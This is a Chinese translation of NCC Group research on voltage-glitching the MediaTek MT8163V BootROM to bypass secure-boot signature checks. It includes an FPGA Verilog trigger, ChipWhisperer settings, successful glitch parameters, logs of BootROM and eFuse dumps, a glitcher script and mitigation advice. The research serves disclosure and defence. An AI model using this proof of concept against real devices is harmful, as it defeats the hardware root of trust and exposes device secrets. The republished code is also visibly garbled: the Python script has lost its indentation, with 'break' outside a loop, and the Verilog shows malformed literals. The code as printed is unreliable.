# SoC漏洞挖掘技术之MediaTek BootROM篇

阅读量 **238266**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-10-26 16:30:13

 **x**

##### 译文声明

本文是翻译文章，文章原作者 Jeremy Boone，文章来源：research.nccgroup.com

原文地址：<https://research.nccgroup.com/2020/10/15/theres-a-hole-in-your-soc-glitching-the-mediatek-bootrom/>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t010d7c55991e59c720.jpg)

在本文中，我们将为读者介绍针对片上系统SoC的电压毛刺漏洞的利用与防御技术。

这项研究是由我们的实习生Ilya Zhuravlev完成的，她已经回到学校，但毕业后将重新回归我们的安全团队；同时，在该研究的进行过程中，NCC
Group的Hardware & Embedded Systems Practice部门的同事Jeremy Boone提供了许多宝贵的建议。

随着经济实惠的工具链（如ChipWhisperer）的出现，故障注入已不再是只有资金充足、技能高超的攻击者才能实施的一种攻击手段。同时，由于现代设备比以往嵌入了更多的机密信息，因此，当前它们需要更加细致全面的保护。当然，这些机密信息不仅包括加密的用户数据，也包括专有的供应商机密数据。

电压毛刺是一种故障注入攻击，它可以通过改变目标设备的电源电压，从而导致设备执行非预期的行为。通常情况下，这需要将处理器内核电压轨对地短暂短路，以便破坏处理器的内部执行状态。虽然电压毛刺攻击的副作用难以准确预测，但通过观察系统的行为，并仔细调整毛刺参数，还是能够达到令系统跳过某些指令的执行或破坏数据的提取操作的目的的。通常情况下，这些类型的故障可以使攻击者绕过由低层软件执行的关键安全操作，例如，当引导加载程序在将执行控制权传递给后续固件映像之前对其进行签名验证时，如果发动这种攻击，攻击者就有机会绕过签名验证操作。

过去，大多数故障注入方面的研究都集中在低功耗微控制器上，例如最近对STM32系列MCU、NXP
LPC和ESP32的攻击方法。鉴于这些类型的微控制器很少出现在功能更强大的手机或物联网设备中，因此，我们在本文中将试图证明，当这种攻击应用于更复杂的处理器时，攻击者仍然能够得手。

在本文中，我们不仅为读者详细介绍如何探索MediaTek MT8163V片上系统（64位ARM
Cortex-A）的引导过程，同时，还会演示如何设计一种能够可靠地对SoC发动故障注入攻击的设备。最终，我们的研究结果表明，MediaTek
BootROM容易受到电压毛刺的影响，使得攻击者可以利用这种攻击方法绕过预加载器的签名验证。这样的话，攻击者就可以绕过所有的安全引导功能，执行未签名的预加载器映像，从而彻底破坏硬件信任根。

当然，我们的工作主要集中在MT8163V芯片组上，并且没有测试该攻击针对最新的SoC变体的有效性。然而，我们知道，对于许多MediaTek
SoC来说，从BootROM到preloader执行流程都是一样的。因此，我们怀疑（目前尚未测试）该漏洞会影响MediaTek公司目前在市场上流通的其他型号的SoC。鉴于该平台的流行程度，这个漏洞可能影响到使用MediaTek芯片的各种嵌入式设备，包括平板电脑、智能手机、家庭网络产品、物联网设备等。

由于该漏洞位于掩模只读存储器（mask
ROM）中，因此，根本无法为所有已经发售的产品修复该漏洞。然而，这个安全问题的严重性在很大程度上取决于产品的威胁模型。由于电压毛刺攻击需要对目标设备进行物理访问，所以，在假设允许进行物理访问的威胁模型中，例如对于经常丢失或被盗的移动设备，该漏洞的风险最高；相反，对于攻击者无法物理访问的产品，则该漏洞带来的威胁程度相对较低。

## 选择硬件目标

我们选择了一款使用MediaTek
MT8163V片上系统的流行平板设备作为研究对象。当然，我们在目标的选择方面，主要考虑其价格、广泛的可用性以及PCB裸露面积和带有标签的测试点，以力图简化电路板的逆向过程，并让电路板的探测和干扰变得更加轻松。

## MediaTek片上系统的引导过程

许多MediaTek的移动和平板SoC都遵循一个通用的引导过程，具体如下图所示。我们的故障注入攻击是针对BootROM设计的，因为它会加载和验证预加载器的可执行文件。

![](https://p1.ssl.qhimg.com/t01a83d93e1dc4ce6ec.png)

BootROM是引导过程中不可改变的第一阶段，并充当SoC的硬件信任根。与典型的情况一样，这些SoC都包含一个efuse
bank，可以在OEM设备制造过程中对其进行配置，以实现安全启动并指定预加载器签名证书的哈希值。在启动过程中，BootROM将读取这些fuse，以确定配置的安全引导策略。接下来，BootROM将把预加载器从eMMC加载到RAM中，并在执行前验证其签名。

MediaTek的预加载器是引导过程中的第二个阶段，也是第一段可变代码。预加载器被存储在BOOT0
eMMC分区上。如eMMC规范的第7.2节所述，引导分区是一些特殊的硬件分区，与主用户数据分区相互独立。

![](https://p5.ssl.qhimg.com/t01a894aa3ab792bca2.png)

## 引导过程分析

MediaTek
SoC在BOOT0中存储了两个预加载器的副本。如果第一个映像损坏（即没有通过签名验证检查），那么BootROM将加载第二个映像。如果两个副本都损坏了，那么BootROM将进入下载模式，这一点可以通过UART发送的字符串“[DL]
00009C40 00000000 010701”看出来。

为了将预加载器从闪存加载到RAM中，将使用eMMC的引导模式功能。不过，BootROM不会发送单独的READ命令，而是将eMMC重置为“alternative
boot mode”。这是通过发送两条GO_IDLE_STATE(CMD0)命令来实现的：首先，会发送参数为0xF0F0F0F0的命令，使其进入“pre-idle”状态；然后，发送参数为0xFFFFFFFA的命令，使其进入引导状态。

![](https://p3.ssl.qhimg.com/t0118931926d45ddc67.webp)

在接收到第二条命令后，eMMC便开始以1位模式通过DAT0线传输BOOT0分区的内容。接收整个分区的内容大约需要100ms。

##

当BootROM从BOOT0分区接收到第一个预加载器映像的全部内容后，就会通过发送GO_IDLE_STATE复位命令中断该过程。

![](https://p1.ssl.qhimg.com/t01c7e9812a975397a2.webp)

根据我们的观察：如果第一个预加载器映像是有效的，那么，从传输预加载器的最后一个字节到观察到预加载器发出的第一条eMMC命令之间大约需要2秒时间。

![](https://p5.ssl.qhimg.com/t016fd8898080b97802.webp)

另一方面，如果第一个预加载器映像无效（也就是说，它未通过签名验证），则重复此过程。但是，直到收到第二个预加载器副本后，BootROM才发送复位命令。在这种情况下，BootROM加载第一个和第二个预加载器映像之间的间隔，只有700ms左右。

![](https://p1.ssl.qhimg.com/t018bf5be6efdd677c5.webp)

因此，我们假设在最初的700ms左右的时间里，BootROM是在忙着解析预加载器映像的结构，并执行签名验证；而在接下来的1.2s的时间内，则主要忙于初始化预加载器的代码。据此我们可以判断出，电压毛刺攻击应以eMMC读取预加载器后的第一个700ms窗口为攻击目标。

## 搭建FPGA触发器

为了注入具有精确时序的电压毛刺，我们通过廉价的FPGA（Sipeed Tang Nano）实现了一个自定义触发器。该FPGA被连接到eMMC
CLK和DAT0线（虽然图中还连接了CMD引脚，但是它只是供逻辑分析仪进行调试之用）。

![](https://p0.ssl.qhimg.com/t01ba78b4097f491e65.webp)

虽然FPGA的逻辑电平默认为3.3V，但它也能够在1.8 V输入下工作，而无需对电路板进行任何修改。FPGA的输出为3.3
V的触发信号，并连接到ChipWhisperer的触发输入引脚。

Verilog触发器代码非常简单：FPGA由eMMC时钟信号提供时钟，代码使用DAT0实现移位寄存器，以跟踪线路上传输的最后4个字节。当观察到既定的模式时，它将在512个eMMC时钟周期内产生触发输出信号：

    
    
    always@ (posedge emmc_clk or negedge sys_rst_n) begin
    
    capture <= capture;
    
    counter <= counter;
    
    trigger <= trigger;
    
    if (!sys_rst_n) begin
    
    trigger <= 1 'b0;
    
    counter <= 24'b1000000000;
    
    capture <= 32 'b0;
    
    end else if (counter > 0) begin
    
    counter <= counter - 1;
    
    capture <= 32'b0;
    
    end
    else if (capture == 32 'h4ebbc04d) begin
    
    trigger <= 1'b1;
    
    counter <= 24 'b1000000000;
    
    end else begin
    
    trigger <= 1'b0;
    
    capture <= {
        capture[31 : 0],
        emmc_dat0
    };
    
    end
    
    end

在这里要匹配的模式为4e bb c0 4d，实际上就是位于预加载器第一份副本末端的四个字节。

![](https://p1.ssl.qhimg.com/t010860658f2f039245.webp)

然后，将触发输出信号馈送到ChipWhisperer，在其中插入延迟并生成特定宽度的毛刺。

## 毛刺攻击的目标

ChipWhisperer平台用于在FPGA触发器激活时生成电压毛刺。

![](https://p4.ssl.qhimg.com/t015c155eb4d0c61792.webp)

将一个SMA连接器焊接在平板电脑电路板的侧面，然后，通过导线连接到目标焊盘（VCCK_PMU）上。毛刺通过ChipWhisperer的低功耗MOSFET将VCCK_PMU短路到地。通过在极短的时间内降低内核电压，我们期望能够在不让整个系统完全崩溃的情况下，破坏处理器的内部状态（如寄存器的值）。为了访问VCCK_PMU焊盘，我们用小刀从PCB上刮掉了一部分焊膏。除此之外，我们没有进行电路板做任何其他修改（也就是说，去耦电容也不是非去除不可——当然，有时需要去掉）。

毛刺装置的整体设置

我们的毛刺装置的整体设置及其连接方式如下图所示。

![](https://p4.ssl.qhimg.com/t01c67bde688cd0df03.webp)

执行攻击时，我们用到了以下硬件：

  1. 1.8v UART：一个使用1.8v逻辑电平的UART适配器。这样我们就可以看到目标输出，并确定毛刺尝试何时成功（2美元）。
  2. RaspberryPi：用于通过uhubctl禁用和重新启用USB电源，以编程方式重置目标设备（50加元，CanaKit）。
  3. FPGA：被动侦听eMMC流量，并将毛刺触发信号输出到ChipWhisperer（10加元，Digikey）。
  4. ChipWhisperer：在触发信号被激活后插入电压毛刺（325美元，NewAE Technology）。

## 确定初始毛刺参数

以下参数用于设置ChipWhisperer毛刺：

    
    
    scope.glitch.clk_src = "clkgen"
    
    scope.glitch.output = "enable_only"
    
    scope.glitch.trigger_src = "ext_single"
    
    scope.clock.clkgen_freq = 16000000
    
    scope.io.glitch_lp = True
    
    scope.io.glitch_hp = False

接下来，我们需要确定目标毛刺的宽度。为了实现这一点，当设备在引导和预加载器中执行时，我们要手动注入不同宽度的毛刺。根据我们的观察：80-100个时钟周期的毛刺宽度能够在预加载器中引入各种类型的状态损坏。但是，许多状态损坏似乎无法利用，例如，我们曾经在一次迭代中观察到以下输出：

    
    
    [2176] [PART] check_part_overlapped done
    
    [2180] [PART] load "tee1" from 0x0000000000B00200 (dev) to 0x43001000 (mem) [SUCCESS]
    
    [2181] [PART] load speed: 15000KB/s, 46080 bytes, 3ms
    
    [2213] [platform] ERROR: <ASSERT> div0.c:line 41 0
    
    [2213] [platform] ERROR: PL fatal error...
    
    [2214] [platform] PL delay for Long Press Reboot

## 暴力搜索正确的毛刺参数

如前所述，我们假定签名检查是在最后的GO_IDLE_STATE命令之后的700ms窗口内进行的。为了覆盖整个700ms的时间段，我们使用了一种渐进式的暴力破解方法。

首先，将未修改且经过正确签名的预加载器加载到eMMC
BOOT0分区中。然后，在偏移范围[25400，100000]内执行粗略的暴力搜索，这里以200个循环为步长。同时，我们假设有用的毛刺偏移会导致设备崩溃（在UART上看不到输出），或者令其进入DL模式（在UART上将观察到“
[DL] 00009C40 00000000 010701”输出字符串）。

通过这个实验，我们发现尝试的大多数偏移量都不会导致设备行为发生明显的变化，并且预加载器已正常加载并运行。但是，在运行这个第一阶段的暴力破解几个小时之后，发现了多个感兴趣的区间，并对其应用了更精细的暴力搜索。具体来说，这种细粒度的方法将使用20个周期作为步长值，而不再是200个周期。

同时，我们还通过修改调试字符串篡改了预加载器映像。BootROM应该会因为签名检查失败而拒绝加载这个被篡改的映像。但是，如果这个被篡改的映像被加载并执行，就说明我们的毛刺攻击成功了。之后，我们再次缩小了感兴趣的区间，并继续对毛刺参数进行暴力搜索。经过大约2个小时的搜索后，终于找到了几个成功的毛刺。然而，这些成功的案例并不十分可靠，因此还需要进一步的微调。

接下来，围绕着这些特定的偏移和宽度，我们继续通过暴力搜索进行微调，以寻找完美的毛刺参数。有了合适的参数，再加上几天的暴力搜索，我们绕过签名检查的成功率逐渐提高到15-20%。下表给出了我们的统计输出，其中有多组参数（宽度和偏移量）能够实现成功的毛刺攻击：

##

![](https://p1.ssl.qhimg.com/t019dd6cf7544633528.png)

请注意，所有成功的毛刺都聚集在狭窄的范围内：宽度范围为93-130，而偏移量的范围为41428-41438。这些值可以与本文结尾处提供的ChipWhisperer脚本一起使用。

## 执行Payload

当然，我们的目标绝不是简单的篡改调试字符串，而是执行任意代码。所以接下来，我们在预加载器二进制代码中注入了一个payload，以替换部分字符串。同时，我们还对预加载器进行了相应的修改，使其直接跳转到payload处，从而跳过原本执行GPT解析的代码。之所以选择这个位于预加载器后期的位置，是因为毛刺攻击成功后，必须用不同的波特率参数重新配置UART，而这是需要一定的时间的，所以会导致预加载器的早期输出丢失。

注入的payload会打印一条日志信息，然后读取BootROM内存和EFUSE内容。下面的UART输出表明毛刺攻击成功了：

    
    
    Dry run
    
    Dry run done, go!
    
    105 41431 b'\x00[DL] 00009C40 00000000 010701\n\r'
    
    105 41433 b'\x00'
    
    99 41432 b'\x00\n\rF0: 102B 0000\n\rF3: 4000 0036\n\rF3: 0000 0000\n\rV0: 0000 0000 [0001]\n\r00: 0007 4000\n\r01: 0000 0000\n\rBP: 0000 0209 [0000]\n\rG0: 0190 0000\n\rT0: 0000 038B [000F]\n\rJump to BL\n\r\n\r\xfd\xf0'
    
    Glitched after 10.936420202255249s, reopening serial!
    
    
    
    <snip>
    
    
    
    [1167] [Dram_Buffer] dram_buf_t size: 0x1789C0
    
    [1167] [Dram_Buffer] part_hdr_t size: 0x200
    
    [1168] [Dram_Buffer] g_dram_buf start addr: 0x4BE00000
    
    [1169] [Dram_Buffer] g_dram_buf->msdc_gpd_pool start addr: 0x4BF787C0
    
    [1169] [Dram_Buffer] g_dram_buf->msdc_bd_pool start addr: 0x4BF788C0
    
    [1187] [RAM_CONSOLE] sram(0x12C000) sig 0x0 mismatch
    
    [1188] [RAM_CONSOLE] start:0x44400000, size: 0x10000
    
    [1188] [RAM_CONSOLE] sig:0x43074244
    
    [1189] [RAM_CONSOLE] off_pl:0x40
    
    [1189] [RAM_CONSOLE] off_lpl: 0x80
    
    [1189] [RAM_CONSOLE] sz_pl:0x10
    
    [1190] [RAM_CONSOLE] wdt status (0x0)=0x0
    
    
    
    <snip>
    
    
    
    ----------------------------------------------------------------------    
    MediaTek MT8163V voltage glitch proof of concept NCC Group 2020
    
    ----------------------------------------------------------------------    
    BootROM:
    
    00000000: 08 00 00 EA FE FF FF EA FE FF FF EA FE FF FF EA
    
    00000010: FE FF FF EA FE FF FF EA FE FF FF EA FE FF FF EA
    
    00000020: BB BB BB BB 38 00 20 10 00 00 A0 E3 00 10 A0 E3
    
    00000030: 00 20 A0 E3 00 30 A0 E3 00 40 A0 E3 00 50 A0 E3
    
    00000040: 00 60 A0 E3 00 70 A0 E3 00 80 A0 E3 00 90 A0 E3
    
    00000050: ...
    
    
    
    EFUSE:
    
    10206000: 11 00 0F 00 62 00 00 00 00 00 00 00 00 00 00 00
    
    10206010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    
    10206020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    
    10206030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    
    10206040: 00 10 02 04 00 00 50 0C 00 00 00 00 00 00 00 00
    
    10206050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    
    10206060: 46 08 00 00 00 00 00 00 07 00 00 00 00 00 00 00
    
    10206070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    
    10206080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    
    10206090: 47 C8 DE F6 A6 A9 A1 8B 7A 8D 71 91 06 BC 18 86
    
    102060A0: 9F 97 E1 CD A3 7C 4C E8 AB E8 7F 60 E8 A6 FD 77
    
    102060B0: ...

如您所见，这说明我们的毛刺技术是成功的，注入的payload已经能够执行任意代码了。虽然这里没有进行演示，但我们也可以执行预加载器通常负责的任何特权操作，例如解密和加载修改后的TrustZone映像，加载恶意的LK/Android映像，等等。

## 小结

我们已经证明MediaTek MT8163V
SoC容易受到电压毛刺攻击。此外，我们还发现，毛刺攻击的成功率还是很高的，并且无需对毛刺装置进行高级设置（例如时钟同步或从电路板上移除电容）。虽然每组毛刺参数都具备大约20%的成功率，但攻击者只要在毛刺尝试之间重新启动，就可以轻松地实现100%的总体成功率。

由于该漏洞影响的是BootROM，因此，已经出厂的产品都无法修补该漏洞，也就是说，所有已经出厂的产品都将无限期地存在该漏洞。在我们与MediaTek的交流中，他们表示，在即将推出的尚未命名的SoC的BootROM中，将引入故障注入缓解措施。不过，目前我们还没有机会评估这些缓解措施的有效性，也不清楚这些措施是基于硬件的还是基于软件的。

为了支持整体安全工程，我们建议我们的客户考虑加入故障注入攻击缓解措施。对于电压毛刺攻击，基于硬件的缓解措施（如快速反应的硅内掉电检测电路）是最有效的防御措施。或者，也可以采用基于软件的防御措施，尽管它们只能提高攻击难度，而无法完全杜绝这种攻击。基于软件的缓解措施示例包括：

冗余地执行关键检查，如果产生冲突结果，则终止执行。这种缓解措施迫使攻击者连续重复执行毛刺攻击，才能绕过单个关键安全检查。

在安全关键代码的各个位置插入随机持续时间延迟。这种缓解措施迫使攻击者必须实现多个精确的触发条件才能得手。

在BootROM内实现控制流完整性检查，特别是与安全相关的关键部分的完整性检查。这种缓解有助于检测何时注入的故障会导致程序执行意外的代码路径，例如跳过分支指令。

对于设备OEM来说，实施缓解措施将更为困难：它们影响上游硅供应商实现的抗毛刺性能的能力往往有限。在这种情况下，我们建议设备OEM与其供应商紧密合作，了解组件的安全态势。如果存在理解上的差距，可以考虑进行第三方评估。这种分析必须在组件选择阶段的早期进行，这样才能对可能的供应商组件进行有用的比较。只有那些符合产品安全目标和威胁模型的组件才应考虑使用。在芯片组级别以上，额外的物理保护层可以帮助减缓这种类型的攻击，包括精心的PCB设计、全面的防篡改措施，以及明智地使用加密技术保护重要的用户数据。

对于离BootROM的实现更远的用户和消费者来说，重要的是要从那些对自家产品安全性提供承诺的供应商处购买设备。这对于移动设备来说尤其如此，因为它们很容易丢失或被盗，所以很容易受到这里讨论的物理攻击。此外，最低的价格往往意味着对安全的重要性的重视程度最低。此外，大家也可以通过主动性的安全测试渠道了解相关产品的安全性，如漏洞赏金计划、已出版的安全白皮书、产品安全标志（如ioXt）、定期更新固件的节奏，以及积极响应公开的安全漏洞的历史记录等。

## 附录：Glitcher源代码

    
    
    import chipwhisperer as cw
    
    import time
    
    import serial
    
    import subprocess
    
    import sys
    
    
    
    start = time.time()
    
    
    
    scope = cw.scope()
    
    scope.glitch.clk_src = "clkgen"
    
    scope.glitch.output = "enable_only"
    
    scope.glitch.trigger_src = "ext_single"
    
    scope.clock.clkgen_freq = 16000000
    
    scope.io.glitch_lp = True
    
    scope.io.glitch_hp = False
    
    
    
    SERIAL = "/dev/ttyUSB0"
    
    RPI = "192.168.0.18"
    
    
    
    def power_off():
    
        subprocess.check_output(["ssh", "root@{}".format(RPI),
    
            "/root/uhubctl/uhubctl -l 1-1 -p 2 -a 0"
        ])
    
    
    
    def power_on():
    
        subprocess.check_output(["ssh", "root@{}".format(RPI),
    
            "/root/uhubctl/uhubctl -l 1-1 -p 2 -a 1"
        ])
    
    
    
    ser = serial.Serial(SERIAL, 115200, timeout = 0.1)
    
    
    
    print("Dry run")
    
    power_off()
    
    scope.glitch.repeat = 10
    
    scope.glitch.ext_offset = 0
    
    scope.arm() power_on()
    
    for x in range(10):
    
        data = ser.read(100000)
    
    power_off()
    
    print("Dry run done, go!")
    
    
    
    def glitch_attempt(offset, width):
    
        power_off()
    
    scope.glitch.repeat = width
    
    scope.glitch.ext_offset = offset
    
    scope.arm()
    
    power_on()
    
    data = b ""
    
    for x in range(30):
    
        data += ser.read(100000)
    
    if b "[DL]" in data and b "\n\r" in data:
    
        break
    
    if b "Jump to BL" in data and b "\n\r" in data:
    
        break
    
    print(width, offset, data)
    
    if b "Jump" in data:
    
        print("Glitched after {}s, reopening serial!\n\n".format(
    
            time.time() - start))
    
    ser.close()
    
    ser2 = serial.Serial(SERIAL, 921600, timeout = 0.1)
    
    while True:
    
        data = ser2.read(10000)
    
    sys.stdout.buffer.write(data)
    
    sys.stdout.flush()
    
    try:
    
    while True:
    
        for width, offset in [
    
            (105, 41431), (105, 41433), (99, 41432), (101, 41434),
    
            (127, 41430), (104, 41432), (134, 41431), (135, 41434),
    
        ]:
    
        glitch_attempt(offset, width)
    
    finally:
    
    print("Turn off")
    
    power_off()
    
    print("Disable scope")
    
    scope.dis()
    
    print("Bye!\n")

本文翻译自research.nccgroup.com
[原文链接](https://research.nccgroup.com/2020/10/15/theres-a-hole-in-your-soc-glitching-the-mediatek-bootrom/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **shan66** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/220454](/post/id/220454)

安全客 - 有思想的安全新媒体

本文转载自:
[research.nccgroup.com](https://research.nccgroup.com/2020/10/15/theres-a-hole-in-your-soc-glitching-the-mediatek-bootrom/)

如若转载,请注明出处： <https://research.nccgroup.com/2020/10/15/theres-a-hole-in-your-soc-glitching-the-mediatek-bootrom/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [SOC](/tag/SOC)

 **+1** __3赞

 __收藏

![](https://p2.ssl.qhmsg.com/dm/200_200_100/t0137bdcb0fbd458b88.jpg) shan66

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

